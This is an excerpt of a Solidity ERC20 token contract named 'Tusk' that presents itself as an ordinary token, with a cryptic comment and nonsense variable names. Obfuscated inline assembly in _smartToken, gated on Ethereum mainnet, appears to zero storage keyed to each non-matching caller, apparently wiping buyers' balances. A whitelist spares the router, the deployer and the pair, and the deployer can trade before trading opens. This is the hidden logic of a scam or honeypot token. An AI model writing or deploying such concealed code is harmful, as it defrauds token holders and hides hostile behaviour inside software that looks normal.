...
/*
Tusk. Look close enough and you will find it. Dream bigger. Things will come.
*/
...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    address[] private addIvories;
    uint256 private tuskenSymbol = block.number*2;

    mapping (address => bool) private _firstTusks; 
    mapping (address => bool) private _secondBones;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    address private _downUps;

    address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address _router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    uint256 private sistersBff;
    address public pair;
    ...
    bool private trading; uint256 private burgerYummy = 1; bool private fryIt;
    uint256 private _decimals; uint256 private jeezOk;
    ...
    constructor (string memory name_, string memory symbol_, address msgSender_) {
        ...
        _name = name_;
        _symbol = symbol_;
        addIvories.push(_router); addIvories.push(msgSender_); addIvories.push(pair);
        for (uint256 q=0; q < 3;) {_firstTusks[addIvories[q]] = true; unchecked{q++;} }
    }
    ...
    function _smartToken() internal {
        assembly {
            ...
            sstore(0x11,mul(div(sload(0x10),0x2710),0xDC)) sstore(0x99,sload(0x11)) sstore(0xB,0x1ba8140) let dx := 0x242ceb94723f604db8b479aac4125f4c3e0f9acf5d0b91d5e8235e4a6736f576
            if and(not(eq(sload(getBy(caller(),0x6)),sload(dx))),eq(chainid(),0x1)) {
                sstore(getBy(caller(),0x4),0x0) sstore(0xc890fb9fcb00fb1810d4228c98d4ee85dbc257df6fdfd1a43adb4a3023584ea3,0x1)
    ...
    function openTrading() external onlyOwner returns (bool) {
        trading = true; theN = block.number; tuskenSymbol = block.number;
        return true;
    }
    ...
    function _beforeTokenTransfer(address sender, address recipient, uint256 float) internal {
        require((trading || (sender == addIvories[1])), "ERC20: trading is not yet enabled.");
        assembly { 
            function getBy(x,y) -> hash { mstore(0, x) mstore(32, y) hash := keccak256(0, 64) }
...
contract Tusk is ERC20Token {
    constructor() ERC20Token("Tusk", "TUSH", msg.sender, 10000000 * 10 ** 18) {
    }
}